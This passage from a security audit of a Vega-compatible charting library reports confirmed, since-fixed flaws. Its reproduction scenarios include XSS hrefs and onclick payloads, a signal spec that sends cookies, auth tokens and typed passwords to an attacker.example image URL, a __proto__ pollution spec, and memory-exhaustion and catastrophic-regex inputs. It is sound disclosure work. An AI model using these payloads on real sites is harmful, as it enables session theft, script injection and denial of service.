- **Direction.** A hermetic PR test that reads the files at the merge base and fails when a floor drops, a passing id disappears, a manifest file count shrinks or `repo`/`commit` changes without an explicit override. Make `pass > floor` a failure.

#### C263 — Medium — Both schema sweeps return at the first enum branch, so the other branches of a mixed property are never generated

- **Location:** `packages/conformance/src/sweeps/vega-schema.mjs:1410-1423`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #205 (0bf91e3,56101b3). Fixed: enumerableUnion offers every enum word, both booleans and the numbers of every branch in both schema sweeps (Vega 7549 to 7760 cases, Vega-Lite 27513 to 31505).
- **Area:** closure / gallery, sweeps, canvas helpers, corpus-tz
- **Lane ID / scripts:** `w3-confsrc-1` — `w3-confsrc/`

`packages/conformance/src/sweeps/vega-schema.mjs:1410-1423` and `packages/conformance/src/sweeps/vega-lite-schema.mjs:456-467`.

- **Mechanism.** `declaredValues` loops over the branches and returns at the first one with an `enum`. The boolean and number loops come after it, so they are never reached for a property that also has an enum, and a second enum branch is never read.
- **Observed** (`$S/mixed.mjs` against the pinned schemas; `$S/gen.mjs` confirms the generated case names):
  - Vega `tickCount` (axis, legend): only the 8 interval words. The numbers `[0, 0.5, 8, -4]` are never offered. Generated values for `axis.tickCount` are `millisecond … year` and nothing else.
  - Vega `labelOverlap` (axis, legend): only `parity`, `greedy`. Never `true` or `false`.
  - Vega `scale-time` / `scale-utc` `nice`: only interval words. Never a boolean.
  - VL `tickCount` (Axis, Legend, AxisConfig, LegendConfig): never a number.
  - VL `Scale.nice`: never a boolean or a number.
  - VL `stack`: `zero`, `center`, `normalize`. Never `true`, `false`.
  - VL `timeUnit`: 11 local single units. 97 further words (`utc*`, every multi unit such as `yearmonth`, the binned ones) are never generated.
  - VL `sort`: `ascending`, `descending`. The 24 by-channel words (`x`, `-x`, `color`, …) are never generated.
  - VL `Scale.scheme`: the first enum (categorical names). 318 further scheme names are never generated.
- **Expected.** The header promises this surface: `vega-schema.mjs:28` ("an enum, including one inside a `oneOf` beside a signal reference: every word it lists"), `:30` ("a number: a small fixed set"), and `:1356` names `tickCount` as a property the `$ref` following makes reachable.
- **Status: CONFIRMED-RUN** — `$S/mixed.mjs`, `$S/gen.mjs`.
- **Direction:** collect the union over all branches (every enum word, plus booleans, plus numbers) instead of returning at the first kind. The case floor will need raising afterwards.

#### C528 — Low — `runPage` leaks the browser when a worker rejects, and creates a temp directory it never uses

- **Location:** `packages/conformance/src/gallery/react.ts:61-63`
- **Status:** CONFIRMED (traced)
- **Resolution:** FIXED in #205 (3702dd2). Fixed: a rejecting worker stops the others and the browser is closed in the finally; the dead temp directory is gone (the test fails without the close).
- **Area:** closure / gallery, sweeps, canvas helpers, corpus-tz
- **Lane ID / scripts:** `w3-confsrc-7` — `w3-confsrc/`

`packages/conformance/src/gallery/react.ts:61-63, 71, 105-109`.

- **Browser leak.** `browser.close()` at `:106` runs only after `Promise.all` resolves. A worker can reject at `open()` (`:79-80`, the 30 s `waitForFunction`, also reached at `:98` after a page crash) or at `ctx.newPage()` (`:97`). `Promise.all` then rejects, the `finally` only removes the temp directory, Chromium stays up, and the other workers keep running and calling `onResult` after `runPage` has rejected.
- **Dead temp directory.** `tmp` (`:61`, `:63`) is never written to: the bundle is built with `write: false` and served from memory. The `mkdirSync` on a directory `mkdtempSync` just made is a no-op.
- **Status: CONFIRMED-TRACE.**
- **Direction:** close the browser in the `finally`, and delete the temp directory code.

### 3.6 Boundary & safety (55)

#### C1 — Critical — An encode channel named `__domDesc` is taken verbatim as the item's cached DOM descriptor

- **Location:** `packages/core/src/dom.ts:488-501`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #191 (85ce62a,f075640,9a89934,1b08c14,abe8e82). Fixed: the DOM descriptor cache lives in a WeakMap beside the items, the patcher never sets on* attributes, and every encode channel naming engine state (`_*`, scene-type fields that are not vega's) is refused at compile; engine-slots-vs-vega.test derives both lists from types.ts, vega's builds and core's source.
- **Area:** core / SVG, DOM patcher, canvas, a11y
- **Lane ID / scripts:** `core-render-1` — `core-render/`

**An encode channel named `__domDesc` is taken verbatim as the item's cached DOM descriptor.**

- Encode copies every channel name onto the scene item. `inject2.mjs` shows `__domDesc`, `_hit`, `_drawError`, `dataDatum`, `image`, `_clip`, `_part`, `_bg`, `urlDenied` and an arbitrary name all landing on the item.
- `cachedDesc` trusts it when the item is "clean" (`dom.ts:489-496`): `const cached = it.__domDesc …; if (isClean(it) && cached) { cached.clean = true; return cached }`.
- `createEl` (`dom.ts:864-874`) then calls `createElementNS(SVG_NS, desc.tag)` and `setAttribute(k, v)` with whatever the descriptor says.
- An item is clean on first description whenever its first generation was not drawn by the patcher. That is the `<Chart>` mount (`ChartCore.tsx:757` `__html: renderSceneToSvg(...)`, then `:881 patchSceneDom`), SSR + `hydrateChart`, and a canvas→svg switch.
- **Scenario:** spec `encode.update.__domDesc: {field: 'd'}`, row `d = {tag:'a', attrs:[['xlink:href','javascript:alert(document.domain)'],['onclick','…']], children:[…]}`; mount, then append one row.
- **Observed** (`inject5.mjs`, real `<Chart>` under jsdom): after the update the chart contains `<a xlink:href="javascript:alert(document.domain)" onclick="window.PWNED = …">`, and a dispatched click runs the handler (`window.PWNED = handler ran`).
- `inject3.mjs`: `{tag:'script', text:…}` lands as two `<script>` elements inside `.mark-rect`. jsdom did not execute them; I did not run a browser.
- The string renderer is not affected (`string render contains <script: false`). A patch-only mount is also safe (0 script elements).
- **Expected:** nothing in a spec or row can name an element or attribute.
- **Status:** CONFIRMED-RUN — `inject3.mjs`, `inject4.mjs` (core), `inject5.mjs` (`<Chart>`).
- **Direction:** keep renderer state off the item (a `WeakMap<SceneItem, DomDesc>`, as `MARK_DESCS`/`RUN_DESCS` already are), and/or have the encoder refuse channel names in the engine's reserved space (`__*`, `_*`, `dataDatum`, `image`, `urlDenied`).
- Same root cause, smaller effects (`inject6.mjs`): `_drawError: {value: X}` makes `renderSpec` throw the attacker's value (`render.ts:217-220`); `dataDatum` forges `data-datum`; `_hit` writes `pointer-events="visible"`.

#### C2 — Critical — URL policy bypass through the in-place item append

- **Location:** `packages/core/src/runtime.ts:5357-5387`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #191 (f075640,1b08c14). Fixed: the in-place append claims the items array and is undone on any throw until supersede, and URLs are vetted as each item is encoded so a kept item is never written again; url-policy-session.test checks random sessions against fresh evaluations and that no returned scene changes.
- **Area:** core / runtime: state, signals, reuse keys (also categories 1)
- **Lane ID / scripts:** `core-rt1-1` — `core-rt1/`

`runtime.ts:5357-5387` (in-place advance), `:5567-5582` (policy), `:5613` (supersede). This is lane core-rt3's range; reported here because it breaks the two guarantees this lane owns.

- **Issue.** The append / same-length fast path writes new items into the previous group's own `items` array (`prevItems.push(item)` :5373). The rollback `try/catch` covers only the encode loop. The previous group becomes a lazy snapshot only at :5613. In between, `applyImageUrlPolicy` (:5570) and `vetLinks` (:5582) throw `AsterUrlError`, which is never recovered. The array stays extended, the previous group still points at it, and nothing is claimed, so the committed state is not flagged stale.
- **Scenario** (`s10c-policy-bypass.mjs`; session, `urlPolicy: { allow: host === 'cdn.example.test' }`, no `limits`): evaluate one good image row; evaluate with a second row at `https://tracker.evil.test/pixel.png` (throws `AsterUrlError (ASTER_URL_DENIED)`, correctly); then give the original rows again.
  ```
  same rows again           -> svg has the denied url: true
  a signal change afterwards -> svg has the denied url: true | images drawn: 2 (rows given: 1)
  fresh evaluation of the same input   -> has the denied url: false
  with `limits` set          -> svg has the denied url: false
  ```
  Expected: no scene ever holds a denied url; one row draws one image.
- **Also** (`s10-throw-after-inplace-append.mjs`, `s10b-leak.mjs`): the scene returned by the first call goes from 2 to 3 mark items during the failed call, for an image `url` and a symbol `href`, via `evaluateChart` + `dataPulse` and via the session's auto-diff. `renderSceneToSvg(first)` then emits `<image xlink:href="https://user:pw@evil.test/track.png">`.
- **Reach.** Any `<Chart urlPolicy>` / session without `limits`. `normalizePulse` (`runtime.ts:3834-3837`) turns a same-length `dataChanges` into the same in-place path, so by reading the code an edit of an existing row is affected too (appends were run; the edit case was not).
- **Status.** CONFIRMED-RUN.
- **Direction.** Make the in-place write and the supersede one unit (snapshot before the first write, or a `finally` that restores `prevItems` up to :5613). Vet urls inside `encodeAt`. Claim the items array so a throw flags the state stale. `ARCHITECTURE.md:115` ("fast paths ... first *claim* it") is not true of this path.

**Independent report of the same defect** (lane ID `docs-arch-6`, scripts `docs-arch/`, CONFIRMED (traced); Unclaimed write):

- **Issue:** the doc says fast paths that update a structure in place "first *claim* it", so a dying evaluation "can never leave a half-updated state behind". `claim()` is called only for a dataset's state and the two censuses.
- **Unclaimed write:** the mark-items append at `runtime.ts:5356-5387` (`prevItems[i] = encodeAt(i)`, `prevItems.push(item)`) has a local try/catch that covers the loop only. `supersedeItems` runs at `:5613`.
- **Scenario:** as the lead already confirmed, a throw between `:5387` and `:5613` leaves the committed scene's array extended while the state is not stale.
- **Also:** line 223 describes this in-place path under "Scenes are never observably mutated" without relating it to the claim rule, so the two paragraphs describe one mechanism differently.
- **Status:** CONFIRMED-TRACE.
- **Direction:** claim the items array (or the group) in `claimed`, or copy-on-append.

#### C3 — Critical — `sanitizeHref` strips a leading `file://` after the allow-check, so `file://javascript:…` becomes `xlink:href="javascript:…"`

- **Location:** `packages/core/src/url-policy.ts:143-149`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #191 (ede341e,0580f70,85ce62a,1b08c14). Fixed: outputUrl applies vega's file:// strip first and judges the text that is written (WHATWG protocol allowlist); sanitizeHref is that function.
- **Area:** core / loading, URL policy, add-ons (also categories 7)
- **Lane ID / scripts:** `core-load-1` — `core-load/`
- **Lead's note:** Upstream Vega 6.3.1 has the same defect; it is reachable only when neither `urlPolicy` nor `limits` is given, and needs a click on the link.

**`sanitizeHref` strips a leading `file://` after the allow-check, so `file://javascript:…` becomes `xlink:href="javascript:…"`.**
- `:145` tests the whole text against `ALLOWED_HREF` (passes: it starts with `file:`); `:146` `if (raw.startsWith('file://')) return raw.slice('file://'.length)` returns the remainder unchecked.
- Scenario: a spec or data row with `href: "file://javascript:alert(document.domain)"`, rendered with no `urlPolicy` and no `limits`.
  - Observed: `<a xlink:href="javascript:alert(document.domain)">`. Expected: no link.
  - Also `file://vbscript:x` → `vbscript:x`, and `file://data:text/html,<script>…` → `data:text/html,…`.
- Inline SVG (the DOM renderer, or the string injected into a page) runs it in the host origin on click.
- Contradicts `url-policy.ts:139-141` ("still cannot carry a script URL into the markup") and `docs/LIMITS.md:504-507` ("`javascript:`, `vbscript:` and the like produce no link, whatever the spec says").
- With `limits` or a `urlPolicy` it is refused, so only the no-policy path is open.
- Upstream vega 6.3.1 has the same defect (the script shows `view.toSVG()` giving the same href). It is inherited, not a documented parity.
- Guard gap: `url-policy.test.ts:149-153` lists script URLs, none behind `file://`.
- Status: **CONFIRMED-RUN** `r01-href-file-js.mjs` — `"file://javascript:alert(document.domain)" => no policy href = "javascript:alert(document.domain)"`; `vega => "javascript:alert(document.domain)"`.
- Direction: re-run the allow test on the value actually returned (after the `file://` strip and the `//` → `http:` prefix), or drop the strip. Add the cases to the test table.

#### C4 — Critical — A handler expression gets the native DOM event, so a spec can read whatever the page can, listen to elements outside the chart, and exfiltrate through an image url

- **Location:** `packages/core/src/signals.ts:997`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #197 (0604090,9c48c00,9caf0f4,0a76dc4). Fixed: handlers see a frozen event facade whose getters read only primitive fields (EVENT_FACADE_FIELDS: no target/view/composedPath), window and CSS-selector sources are confined by a host eventSources policy (DEFAULT_EVENT_SOURCES: selector off, window only pointer/touch/resize), threat model in LIMITS.md; signals.confinement.test walks every path of the facade, and the browser gate runs window sources with a permitting policy (vega parity) and the default (denied).
- **Area:** core / signal event loop, transitions
- **Lane ID / scripts:** `core-signals-1` — `core-signals/`
- **Lead's note:** Rated Critical because `docs/LIMITS.md` presents an untrusted-spec path and `<Chart limits>` binds the loop by default; this is parity with Vega, so if interactive charts are meant for trusted specs only it is a High documentation gap (open question Q1).

`packages/core/src/signals.ts:997`, `:1197`, `:1077`, `:1080`; `docs/LIMITS.md:12-16`, `:155-162`, `:476-484`

**A handler expression gets the native DOM event, so a spec can read whatever the page can, listen to elements outside the chart, and exfiltrate through an image url.**

- **Mechanism:** filters and updates receive the native event (`f(undefined, params(scope), e)` at `:997`; `compiled(undefined, params(scope), e)` at `:1197`). The interpreter blocks calls and function-valued arguments (`expr-interpreter.ts:123`, `:282`, `:330-332`), but member reads on host objects are unrestricted; `event.view` is the `Window`.
- **Sources:** `window:<type>` listens on `window` (`:1077`); any other source is `document.querySelectorAll(source)` over the whole document (`:1080`).
- **Scenario (`t2-exfil.mjs`):** scene evaluated with `limits: { maxRows, maxTimeMs, regex: 'refuse' }` and no `urlPolicy`. Signals:
  - `window:mousemove` → `event.view.document.cookie + '|' + event.view.localStorage.authToken`
  - `{source: '#pw', type: 'input'}` → `event.target.value`
  - `window:keydown` → `keys2 + event.key`
  - an image mark whose `url` concatenates them onto `https://attacker.example/p.gif?c=`
- **Observed:** after a mouse move anywhere on the page and typing in the page's own password field, the signals are `{"leak2":"session=SECRET123|TOKEN-abc","keys":"hunter2","keys2":"x"}`. The re-rendered scene holds `https://attacker.example/p.gif?c=session=SECRET123|TOKEN-abc&pw=hunter2&k=x`. Only `urlPolicy: { allow: () => false }` drops it.
- **Reachable (`t1.mjs`):** `event.view.location.href`, `.document.cookie`, `event.target.ownerDocument.body.innerHTML`, `event.view.localStorage`, `.navigator.userAgent`, `event.constructor`, `event.__proto__`. `event.view.eval` and `.Function` are refused by identity (same realm only).
- **Expected:** the docs state this, or expressions get a facade. LIMITS.md presents limits + load allowlist + worker as "all three you need", describes the image residual risk as "a tracking pixel, an IP leak" (`:481`), and ARCHITECTURE.md:281 says "Aster's stricter sandbox".
- **Severity note:** this is parity with Vega. It is Critical only because the project documents an untrusted-spec path and `<Chart limits>` binds the loop by default; if interactive charts are meant for trusted specs only, it is a High doc gap.
- **Status:** CONFIRMED-RUN.
- **Direction:** hand expressions an allowlisted event facade (type, coordinates, keys, buttons, deltas, `timestamp`/`elapsed`, `item`/`vega`/`dataflow`), never `target`/`view`/`currentTarget`/`relatedTarget`. Under `limits`, refuse `window` and selector sources unless the host opts in. State the model in LIMITS.md.

#### C5 — Critical — `compile()` of a spec with a field named `__proto__` and a legend-bound selection writes `Object.prototype.legendBound = true`

- **Location:** `packages/vl/src/selection.ts:285-287`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #202 (9c1312f,d80a879). every name-keyed table is a prototype-less dict (dict/setOwn/own); prototype-names.test.ts (22 bases, metamorphic) + names.test.ts; since C442 a Object.prototype member's name is refused where Vega mistakes it (the C5 tests accept only that refusal, still assert no write to any prototype)
- **Area:** vl / validate, optimize, predicates
- **Lane ID / scripts:** `vl-rest1-1` — `vl-rest1/`
- **Lead's note:** The polluted key is fixed (`legendBound`) and the value is always `true`: process-wide state corruption that persists across requests in a server-side compile, not an arbitrary-write gadget.

**`compile()` of an untrusted spec writes `Object.prototype.legendBound = true`.**

`checkFieldName` accepts any non-empty string that parses as an access path, so `"__proto__"` passes. `selection.ts:215` keeps projected fields in a plain object (`const byField: Record<string, SelectedField> = {}`) and reads it by user field name:
```
285    const stored = (field !== undefined ? sel.fields.byField[field] : undefined) ?? sel.fields.byChannel[channel]
286    if (stored && bindsLegend(sel)) {
287      stored.legendBound = true
```
`byField['__proto__']` is `Object.prototype`, so the assignment lands on it.

Scenario (schema-valid):
```js
{ data: {values: [{b: 1, c: 'x'}]},
  params: [{name: 'pt', select: {type: 'point', fields: ['c']}, bind: 'legend'}],
  mark: 'point',
  encoding: {x: {field: 'b', type: 'quantitative'},
             color: {condition: {param: 'pt', field: '__proto__', type: 'nominal'}, value: 'grey'}} }
```
`color: {field: '__proto__', type: 'nominal'}` with the same param does it too.

- **Observed:** `compile` returns normally; afterwards `({}).legendBound === true`, `Object.keys(Object.prototype)` is `['legendBound']`, and every `for…in` in the process yields it.
- **Expected:** no write outside the compile's own objects.
- **Bound on impact:** the key is fixed and the value is always `true`, so this is process-wide state corruption rather than an arbitrary gadget. It is persistent and crosses requests in a server-side render.
- **Status: CONFIRMED-RUN** — `repro-proto-pollution.mjs` prints `own props added to Object.prototype: 1` and `({}).legendBound = true`. `protosweep.mjs` put `__proto__`, `constructor`, `toString` and similar into every string position and object key of 12 specs (4,128 mutations): this is the only pollution, and there were no raw `TypeError`s.
- **Direction:** make dictionaries keyed by user strings `Map`s or `Object.create(null)` (`byField`, `byChannel`, `byName` at `selection.ts:77`; worth a repo-wide grep). Optionally refuse `__proto__` as a field, param or dataset name at the gate. Add a scrub-and-assert to `names.test.ts`.

**Independent report of the same defect** (lane ID `vl-rest2-19`, scripts `vl-rest2/`, CONFIRMED (traced); selection field tables are plain objects):

- **Where:** `packages/vl/src/selection.ts:214-215` (`byChannel`, `byField`), tested by `if (byField[field]) continue` at `:243` and `:259`; `byName` at `:77`.
- `fields:["constructor"]` counts as already stored (`byField["constructor"]` is `Object`), so the selection has no fields.
- vega-lite has the same table and result, and such columns fail in real Vega for both compilers, so this is not observable against the oracle. It would be against Aster's runtime, which documents prototype-less tables.
- **Status:** CONFIRMED-TRACE; PLAUSIBLE for the Aster-runtime effect (not run through `@aster-charts/core`).

#### C8 — High — A title's and a subtitle's `href` bypass the URL policy

- **Location:** `packages/core/src/runtime.ts:7899-7906`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #191 (f075640,85ce62a,1b08c14). Fixed: every node of a guide is vetted by the runtime, and every URL is vetted again at the attribute sink; covers title, subtitle, group titles, axes, legends.
- **Area:** core / runtime: marks, encode, groups
- **Lane ID / scripts:** `core-rt3-1` — `core-rt3/`

**A title's and a subtitle's `href` bypass the URL policy.** `vetGuideLinks` vets the guide group and its direct `items` only:
```ts
vet(g)
for (const it of g.items ?? []) vet(it as SceneItem)
```
Axes and legends hand it a flat list of leaves, so they are covered. A title group's items are mark groups, so the text item is one level deeper and never vetted (`t16.mjs`: `href at depth 3 /title/title-text/0 https://evil.example/t`).
- **Scenario:** `title: {text:'Hi', subtitle:'sub', encode:{title:{update:{href:{value:'https://evil.example/t'}}}, subtitle:{…}}}` with `urlPolicy: {allow: () => false}`.
- **Observed:** the SVG contains the evil href twice; no `AsterUrlError`; `onDeny` is not called. Same for a group mark's `title`, for `ftp://…`, and under `limits`.
- **Expected:** docs/LIMITS.md:507-509 and :262 say the policy applies to `href` and a refused one throws or is dropped.
- **Status: CONFIRMED-RUN** — `t15.mjs`, `t17.mjs`, `t16.mjs`. `t17.mjs` for the refused host: `symbol legend [] / gradient legend [] / axis [] / title ['https://evil.example/title','https://evil.example/subtitle']`. Mark, axis and legend controls are dropped or throw as documented.
- **Test gap:** `url-policy.test.ts` has no title, legend or axis case.
- **Direction:** walk the whole guide subtree (as `withGuideGradients` at `:6621-6628` already does), or vet once over the finished scene.

#### C9 — High — A legend's `tickCount` has no built-in ceiling

- **Location:** `packages/core/src/guide-legend.ts:90-92`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #193 (c93ceb3 04c0854 f2a5088 acf002a). Fixed: numeric ticks, every calendar interval's range (time ticks as items, timeSequence/utcSequence as rows, counted up front where the interval can count) and the legend entries listed are bounded where they are made, so legend tickCount/gradientLength and interval tickCounts are refused before allocating, with or without limits.
- **Area:** core / session, stream, limits (also categories 7)
- **Lane ID / scripts:** `core-incr-1` — `core-incr/`

- **Where:** `packages/core/src/guide-legend.ts:90-92` (`listEntries` → `labelValues(scale, count)`, no `ceiling`). The axis path, `packages/core/src/scales.ts:360-362` (`scaleTicks`), has `ceiling('items', count, 'tickCount')`.
- **Claim:** `docs/LIMITS.md:74`, row `items`: "counts a spec sets: `tickCount` of axes and legends (and so the ticks made)".
- **Scenario:** `{ width: 50, height: 50, scales: [{ name: 'c', type: 'linear', domain: [0, 1], range: ['red', 'blue'] }], legends: [{ fill: 'c', tickCount: 5000000 }] }`.

| Input | Expected | Observed |
|---|---|---|
| `renderSpec(spec)`, no limits, 5e6 | `AsterLimitError … tickCount 5000000 > 100000 (built-in ceiling…)` | `FATAL ERROR … JavaScript heap out of memory` (uncatchable) |
| no limits, `tickCount: 100001` | refused | renders a 14 454 415-character SVG in 680 ms (300000 → 29 MB) |
| `limits: { maxTimeMs: 500 }`, 5e6 | typed error near 500 ms | fatal OOM |
| `limits: { maxTimeMs: 500 }`, 3e6 | typed error near 500 ms | error after 3 328 ms |
| `limits: { maxItems: 1000 }`, 5e6 | typed error | `maxItems 5000001 > 1000 (ticks)` in 14 ms |

- **Status:** CONFIRMED-RUN.
  - `node --max-old-space-size=400 $S/t-legend-ceiling.mjs gradient nolimits` (OOM)
  - `… gradient nolimits 100001` (renders 14 MB)
  - `… gradient time` (OOM)
  - `… gradient items` (typed error)
  - `$S/probe.mjs legendGradient time` (3 328 ms)
- **Test gap:** `limits-attacks.test.ts:69-78,418` and `limits.test.ts:210-233` drive axis `tickCount` and `sequence` only.
- **Direction:** route the legend's count through the same guarded function as the axis, or put the ceiling in `tickValues` / `labelValues` when a spec supplies the count. Add the legend to the attack tests in both forms (no limits, `maxTimeMs` only).

**Independent report of the same defect** (lane ID `core-guides-1`, scripts `core-guides/`, CONFIRMED (run); legend and calendar-interval tick counts bypass the built-in ceiling):

- **Where the count is used unbounded:**
  - `packages/core/src/guide-legend.ts:90-92` (`listEntries`: `tickCount(...)` then `labelValues(scale, count)`).
  - `guide-legend.ts:79-80` (`entriesRefusal`, same calls, runs first).
  - `guide-legend.ts:527-530` (gradient default count `2 * floor(gradientLength / 100)`).
- **Where the only ceiling is:** `packages/core/src/scales.ts:360-365`. `ceiling('items', count, 'tickCount')` is in `scaleTicks`, which only the axis path calls (`runtime.ts:8009`), and only `if (typeof count === 'number')`.
- **Interval counts:** `runtime.ts:7970-7972` turns an interval `tickCount` into an interval object, so `scaleTicks` skips the ceiling. `packages/core/src/time.ts:105-112` meters the range only `if (meter)`, i.e. only under `limits`. `runtime.ts:7800` (`ceiling('items', rows.length, 'axis ticks')`) runs after the ticks are allocated.
- **Docs that say otherwise:**
  - `docs/LIMITS.md:74`: "`items` 100 000 — counts a spec sets: `tickCount` of axes and legends (and so the ticks made)".
  - `docs/LIMITS.md:252`: "a few hundred bytes of spec can otherwise exhaust the process".
  - `packages/core/src/limits.ts:163`: "axis ticks, time ticks".

Scenario, with no `limits` or `limits: {}`, each in a child with `--max-old-space-size=1024`:

| Spec | Observed | Expected |
|---|---|---|
| `legends:[{fill:'s', tickCount:1e9}]` (linear colour scale) | `FATAL ERROR ... JavaScript heap out of memory` (SIGABRT) | `AsterLimitError: tickCount 1000000000 > 100000`, as the same count on an axis gives in 17 ms |
| `legends:[{size:'s', tickCount:1e9}]` | fatal OOM | same |
| `legends:[{size:'s', tickCount:2e5}]` | renders, no error | `AsterLimitError` per LIMITS.md:74 |
| `legends:[{fill:'s', gradientLength:1e9}]` (default count 2e7) | fatal OOM | bounded |
| `axes:[{scale: utc [0,1e13], tickCount:'seconds'}]` | fatal OOM | bounded before allocation |
| `axes:[{scale: utc [0,3e10], tickCount:{interval:'milliseconds',step:1}}]` | fatal OOM | bounded |
| `legends:[{fill: utc colour scale, tickCount:'seconds'}]` | fatal OOM | bounded |

With `limits:{maxItems:50000}` all seven throw `AsterLimitError` in under 60 ms. The meter sites exist; only the no-limits ceiling is missing.

Related, lower severity: a symbol legend with `symbolLimit: 0` is not under the `items` ceiling either, while "axis ticks drawn" are. 100 000 entries cost 856 MB RSS and a 65 MB SVG (about 8 kB per entry). A `sequence` of 200 000 feeding an ordinal domain is a fatal OOM at 1 GB.

Status: **CONFIRMED-RUN** — `r1.mjs`, `r2.mjs` (output `r2.out`), `r3.mjs`.

Direction: put the ceiling where the count becomes values, not in one caller. That means `tickCount()` / `labelValues()` for numeric counts, an unconditional cap in the time-interval range loop (`time.ts:108-113`) when no meter is active, and a cap on legend entries listed, like axis ticks drawn. Then make LIMITS.md:74 and `limits.ts:163` say exactly what is covered.

#### C10 — High — The static regex screen never terminates on a pattern containing `\u{` with no closing brace

- **Location:** `packages/core/src/regex-screen.ts:204`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #197 (8662d5d,f42dad4). Fixed: the screen is a full ECMAScript 2025 pattern parser (Annex B, u, v) that terminates on every input and fails closed; differential-regex-screen.test compares its reading with @eslint-community/regexpp 4.12.3 on generated patterns.
- **Area:** core / expressions, regex screen
- **Lane ID / scripts:** `core-expr-1` — `core-expr/`

**The static regex screen never terminates on a pattern containing `\u{` with no closing brace.**

- **Cause:** at `:204`, `const end = this.s.indexOf('}', this.i); … this.i = end + 1`. With no `}`, `end` is -1 and `this.i` becomes 0, so the parser restarts and `sequence()` (`:96-103`) pushes terms for ever. `\p{` at `:199` has an `end > 0` guard; `\u{` does not.
- **Why it is reachable:** `/a\u{/` is a valid regex without the `u` flag (Annex B), so neither the expression parser nor `new RegExp` refuses it first.
- **Scenario:** any limits object, with the pattern reaching `test`/`regexp`/`replace`/`split`/`countpattern` from the spec or a data value. For example `test(regexp(datum.p), datum.s)` with `p = "a\\u{"` under `{maxTimeMs: 250}`.
- **Observed:** the process aborts with `FATAL ERROR … JavaScript heap out of memory` after about 4 s at a 512 MB cap. The loop never reaches a clock check. `[\u{]a` does the same.
- **Expected:** the pattern runs (it is harmless) or is refused with an `AsterLimitError`.
- **Status:** CONFIRMED-RUN, `p3-screen.mjs`: `"a\\u{"  EXIT null SIGABRT FATAL ERROR: Ineffective mark-compacts near heap limit … after 4175ms`.
- **Direction:** guard `end < 0`; make the parser assert that `this.i` strictly increases per atom; add `\u{`, `\x`, `\k<` and modifier-group cases to `regex-screen.test.ts`, which has none.

#### C11 — High — The screen passes valid patterns it misreads and catastrophic shapes just outside its rules

- **Location:** `packages/core/src/regex-screen.ts:160`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #197 (8662d5d,f42dad4,74ee066,700699d,7f70ebb,19c8933,a2c4705). Fixed: the screen reads the whole pattern grammar and refuses exponential ambiguity, too many live paths, backreferences in repeats and what it cannot read whatever the input; every other pattern keeps its cost (work * n^degree from its Glushkov automaton, 8 ns a step), and each run is refused before it starts when that cost on its actual subject exceeds the time left (maxTimeMs, else 100 ms); the soundness test drives every accepted generated pattern through the engine on 10 000- and 1 000-character attack inputs and requires completion within budget or the typed refusal. The screen's own analysis ticks the evaluation's clock and, without maxTimeMs, shares 1 M steps across an evaluation's patterns (fail closed).
- **Area:** core / expressions, regex screen (also categories 7)
- **Lane ID / scripts:** `core-expr-4` — `core-expr/`

**The screen passes valid patterns it misreads and catastrophic shapes just outside its rules.**

`LIMITS.md` says the screen "blocks the known catastrophic shapes" and that unparseable syntax is passed on so "its own syntax error then surfaces". Every case below ran past a 6–8 s kill under `{maxTimeMs: 250}` on a 30–40 character input.

- **(a) Valid syntax that becomes "no hazard" (`:341-345`):**
  - `\x(a+)+$` and `\u(a+)+$`: `:202` and `:205` skip 2 and 4 characters unconditionally, swallowing the group.
  - `\k<(a+)+$`: `:191-196` throws `bad \k`; without named groups `\k` is a literal.
  - `(?i:(a+)+)$`: `:160` throws `unknown group`; modifier groups are valid on Node 26.
- **(b) Shapes the rules do not reach:**
  - Rules 1 and 2 require an unbounded outer quantifier (`:313-316`), so `(a+){1,60}$`, `(a|aa){1,60}$`, `^(\w+\s?){1,50}$` and `(.*a){12}$` pass.
  - Rule 2 only looks at the quantified group's own alternatives (`:316-321`), so `((a|a))*$` and `(?:(a|aa)b?)+$` pass.
- **Status:** CONFIRMED-RUN, `p3-screen.mjs` and `p12-screen2.mjs` (child processes with hard timeouts; the control `(a+)+$` is refused).
- **Direction:** fail closed under limits on unreadable patterns; treat large bounded repeats as unbounded; compute overlap and unbounded-quantifier presence over the whole body of a repeated group; correct `LIMITS.md:296-301`.
- **Severity note:** High rather than Critical because the heuristic disclaimer and the killable-worker advice are documented.

#### C13 — High — The default "non-public hosts are denied" rule lets dotless and internal names through (`http://metadata/`, `*.svc`, `.lan`, `.corp`) and four IPv6 forms

- **Location:** `packages/core/src/addon-load.ts:181-201`

- **Resolution:** FIXED in #192 (7c770de 1e9141b). Fixed: load-host.ts reads the host via the URL parser and refuses dotless names, special/private-use suffixes, non-global IPv4 blocks and all IPv6 outside 2000::/3 (mapped/NAT64/6to4 by embedded IPv4); differential vs Node BlockList over generated addresses; DNS left as a documented limit with rebinding evidence.
- **Area:** core / loading, URL policy, add-ons
- **Lane ID / scripts:** `core-load-5` — `core-load/`

**The default "non-public hosts are denied" rule passes names that can only be internal, and some IPv6 forms.**
- `:183` knows only `localhost`, `.localhost`, `.local`, `.internal`, `.localdomain`.

#### C15 — High — `heatmap` over a data-supplied grid loops without bound; ceilings and `limits` do not stop it

- **Location:** `packages/core/src/raster-transforms.ts:183-205`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** ALREADY FIXED in #194 (04c0854,f665b4c). Bounded by lane a03's allotted heatmap window (04c0854); the audit's 0-wide, NaN-wide, negative-wide and x1=x2 grids are pinned under every limits form in limits-sites.test.ts.
- **Area:** core / compiler, transforms
- **Lane ID / scripts:** `core-xform-2` — `core-xform/`

- **Where:** `raster-transforms.ts:183-205` (`paintGrid`): `:186-187` `x2 = grid.x2 || stride`, `y2 = grid.y2 || grid.height`; `:190-191` `ceiling('cells', w * h, …)` / `boundedCount(w * h, …)`; `:195` `for (let j = y1; j < y2; ++j)`.
- **Issue:** only the product `w*h` is bounded. With `w = 0` or `NaN` it passes and the outer loop still runs `h` times; no `meterTick` in the loop. The grid is a datum value (inline `values` or host data).
